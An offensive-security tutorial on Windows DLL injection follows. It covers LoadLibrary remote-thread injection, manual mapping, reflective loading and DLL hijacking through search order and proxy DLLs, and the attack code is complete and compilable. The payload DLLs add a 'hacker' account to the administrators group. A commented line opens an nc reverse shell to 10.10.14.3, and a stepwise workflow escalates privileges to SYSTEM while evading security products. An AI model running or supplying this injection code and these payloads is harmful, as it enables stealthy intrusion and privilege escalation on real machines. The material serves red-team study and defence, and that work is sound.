## DLL Injection

DLL injection is the act of forcing a running process to load a DLL it did not originally intend to load, causing your code to execute within that process's security context and memory space. It is used legitimately for hot patching and debugging, but offensively it allows code execution inside trusted processes, bypassing many security controls that monitor process launches.

***

## Injection Method Comparison

| Method | Stealth | Complexity | How It Works |
|---|---|---|---|
| LoadLibrary | Low | Low | Remote thread calls LoadLibrary in target process |
| Manual Mapping | High | Very High | Manually maps PE sections, avoids LoadLibrary entirely |
| Reflective DLL | High | High | DLL loads itself from memory without touching disk |
| DLL Hijacking | Medium | Low | Replace or proxy a DLL the process already loads |

***

## Method 1: LoadLibrary Injection

The most straightforward technique. You write your DLL path into the target process's memory and create a remote thread that calls `LoadLibraryA`, causing the target to load your DLL in its own context.

```c
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD targetPID = 1234;                   // Target process PID
    char dllPath[] = "C:\\Tools\\inject.dll"; // Full path to your DLL

    // Step 1: Get a handle to the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess) { printf("OpenProcess failed: %d\n", GetLastError()); return -1; }

    // Step 2: Allocate memory in target process for the DLL path string
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(dllPath),
                                          MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remoteBuffer) { printf("VirtualAllocEx failed\n"); return -1; }

    // Step 3: Write DLL path into the allocated remote memory
    if (!WriteProcessMemory(hProcess, remoteBuffer, dllPath, sizeof(dllPath), NULL)) {
        printf("WriteProcessMemory failed\n"); return -1;
    }

    // Step 4: Resolve LoadLibraryA address in kernel32.dll
    // kernel32.dll is mapped at the same address across all processes
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (!loadLibAddr) { printf("GetProcAddress failed\n"); return -1; }

    // Step 5: Create remote thread in target process starting at LoadLibraryA
    // Windows will call LoadLibraryA(dllPath) inside the target process
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                     (LPTHREAD_START_ROUTINE)loadLibAddr, remoteBuffer, 0, NULL);
    if (!hThread) { printf("CreateRemoteThread failed: %d\n", GetLastError()); return -1; }

    // Wait for injection to complete
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("DLL injected successfully\n");
    return 0;
}
```

**Why this is detectable**: Security products hook `CreateRemoteThread` and `LoadLibraryA`. The DLL also appears in the process's module list, making it visible to tools like Process Explorer.

***

## Method 2: Manual Mapping

Bypasses `LoadLibrary` entirely by manually parsing and loading the PE structure. Because `LoadLibrary` is never called, the DLL does not appear in the `PEB` module list and tools monitoring `LoadLibrary` hooks see nothing.

```
High-level process:
1. Read DLL file as raw bytes into injector process
2. Parse PE headers (IMAGE_DOS_HEADER -> IMAGE_NT_HEADERS -> section table)
3. VirtualAllocEx in target process with size = SizeOfImage
4. Copy PE headers into allocated memory
5. Copy each section (.text, .data, .rdata) to correct offset
6. Fix up the Import Address Table (IAT):
   - For each imported DLL, LoadLibrary it into target
   - For each imported function, resolve address and write to IAT
7. Apply base relocations (if DLL loaded at different address than preferred)
8. Inject shellcode stub that calls DllMain(DLL_PROCESS_ATTACH)
9. Execute stub via CreateRemoteThread or hijack an existing thread
```

Manual mapping is the technique used by most professional game cheats and advanced implants. It is complex enough that in real engagements you would typically use an existing library such as `minhook` or a C2 framework's built-in injection rather than coding it from scratch.

***

## Method 3: Reflective DLL Injection

The DLL contains its own mini-loader (`ReflectiveLoader`) exported by name. You write the DLL bytes to memory in the target process and execute `ReflectiveLoader` directly. The DLL then bootstraps itself:

```
Execution flow after you call ReflectiveLoader:

ReflectiveLoader()
    |
    v
1. Find own base address (walk memory looking for MZ header)
    |
    v
2. Parse own PE headers to find size and sections
    |
    v
3. Resolve LoadLibraryA, GetProcAddress, VirtualAlloc
   from kernel32.dll by walking PEB->Ldr->InMemoryOrderModuleList
    |
    v
4. VirtualAlloc a new region = SizeOfImage
    |
    v
5. Copy headers and sections into new region
    |
    v
6. Fix relocations using IMAGE_DIRECTORY_ENTRY_BASERELOC
    |
    v
7. Resolve IAT imports
    |
    v
8. Call DllMain(DLL_PROCESS_ATTACH)
    |
    v
Fully loaded in memory, never touched disk, not in module list
```

```c
// Minimal example of triggering Reflective DLL Injection
// Assumes DLL bytes are already in remoteBuffer in target process

// Locate the ReflectiveLoader export offset from your DLL file
DWORD loaderOffset = GetReflectiveLoaderOffset(dllBuffer);

// Calculate where ReflectiveLoader will be in the target process
LPVOID loaderAddress = (LPVOID)((ULONG_PTR)remoteBuffer + loaderOffset);

// Execute it
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                 (LPTHREAD_START_ROUTINE)loaderAddress, NULL, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

***

## Method 4: DLL Hijacking

Unlike the other three methods, DLL hijacking does not require any injection code. You exploit the Windows DLL search order so that when a legitimate process starts, it loads your DLL instead of (or before) the intended one.

### DLL Search Order (Safe DLL Search Mode ON - default)

```
1. Directory the application was launched from
2. C:\Windows\System32
3. C:\Windows\System (16-bit, legacy)
4. C:\Windows
5. Current working directory
6. Directories in %PATH% environment variable
```

With Safe DLL Search Mode OFF (registry value `SafeDllSearchMode = 0`), the current working directory moves to position 2, significantly expanding hijack opportunities.

***

### Finding Hijack Candidates with Process Monitor

```
1. Open Procmon and add filter:
   Process Name -> is -> target.exe -> Include

2. Start target application, let it load

3. Add secondary filter:
   Path -> ends with -> .dll -> Include

4. Filter for failed loads:
   Result -> is -> NAME NOT FOUND -> Include

5. Examine results - focus on entries where the search path is:
   - The application directory
   - A user-writable %PATH% directory
```

***

### Technique A: Drop a Missing DLL (NAME NOT FOUND)

When a process searches for a DLL that does not exist anywhere on the system, you simply create it in a location the process will search first.

```c
// x.dll - minimal DLL that executes payload when loaded
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        // This runs in the context of the loading process
        // For SYSTEM-level escalation: process must run as SYSTEM
        WinExec("cmd /c net localgroup administrators hacker /add", SW_HIDE);
        // Or reverse shell:
        // WinExec("cmd /c C:\\Windows\\Temp\\nc.exe 10.10.14.3 8443 -e cmd", SW_HIDE);
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```bash
# Compile on Linux using MinGW cross-compiler
x86_64-w64-mingw32-gcc -shared -o x.dll x.c -lws2_32
# Or for 32-bit target:
i686-w64-mingw32-gcc -shared -o x.dll x.c -lws2_32
```

```cmd
:: Place DLL in the application directory where NAME NOT FOUND was seen
copy x.dll "C:\Program Files (x86)\VulnerableApp\x.dll"

:: Trigger: restart the service or wait for it to reload
sc stop VulnerableService
sc start VulnerableService
```

***

### Technique B: DLL Proxying (Replace Existing DLL)

When a DLL exists and functions are being imported from it, a simple replacement breaks the application. Proxying preserves the original functionality while adding malicious behaviour.

```c
// tamper.c - proxy DLL that wraps library.dll (renamed to library.o.dll)
#include <stdio.h>
#include <Windows.h>

typedef int (*AddFunc)(int, int);

// Export the same function name the application expects
__declspec(dllexport) int Add(int a, int b) {
    // Load original DLL (renamed with .o.dll extension)
    HMODULE orig = LoadLibraryA("library.o.dll");
    if (orig != NULL) {
        AddFunc realAdd = (AddFunc)GetProcAddress(orig, "Add");
        if (realAdd != NULL) {
            // Execute malicious payload
            WinExec("cmd /c whoami > C:\\Windows\\Temp\\pwned.txt", SW_HIDE);

            // Call original function and return real result (application keeps working)
            return realAdd(a, b);
        }
    }
    return -1;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) { return TRUE; }
```

```cmd
:: Deployment steps
rename library.dll library.o.dll      :: Preserve original as library.o.dll
copy tamper.dll library.dll           :: Drop proxy in place of original

:: Application loads library.dll (your proxy)
:: Proxy loads library.o.dll (original) and calls real functions
:: Result: application works normally, payload fires silently
```

***

### Checking SafeDllSearchMode Registry Value

```cmd
:: Check current state
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode

:: 1 = enabled (safe mode, default) - current working directory is position 5
:: 0 = disabled - current working directory is position 2 (easier to hijack)
:: Key missing = treated as enabled

:: Check for hijackable directories in PATH
cmd /c echo %PATH%
:: Any user-writable directory in PATH = potential hijack location

:: Check write access to application directory
icacls "C:\Program Files (x86)\VulnerableApp\"
:: BUILTIN\Users:(W) or (F) = exploitable
accesschk.exe /accepteula -duw "C:\Program Files (x86)\VulnerableApp\"
```

***

## Full DLL Hijacking Workflow

```
Identify target process (runs as SYSTEM or elevated user)
         |
         v
Run Procmon with filter: Process = target, Result = NAME NOT FOUND, Path ends .dll
         |
         v
Identify DLL search locations where load failed:
    App directory? -> Check write access with icacls
    %PATH% entry?  -> Check write access to each PATH directory
         |
         v
Write access confirmed?
    Missing DLL -> Create minimal DLL with DllMain payload -> drop in writable location
    Existing DLL -> Create proxy DLL -> rename original -> drop proxy
         |
         v
Trigger the load:
    Service restart: sc stop/start <service>
    Application restart: taskkill /IM app.exe /F then relaunch
    Wait for scheduled task or reboot
         |
         v
Payload fires in context of loading process
If process = SYSTEM -> full privilege escalation achieved
```
